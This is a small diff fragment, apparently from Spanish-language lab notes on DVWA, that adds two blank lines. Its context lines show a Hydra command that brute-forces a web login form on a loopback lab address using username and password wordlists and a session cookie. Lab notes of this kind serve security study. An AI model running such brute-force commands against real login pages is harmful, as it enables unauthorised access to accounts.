@@ -24,3 +24,5 @@
 ++ Terminal
 --- hydra -L <usuarios.txt> -P <contraseñas.txt> 'http-get-form://127.8.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=<valor>; security=medium:S=Welcome' -V
 
+
+
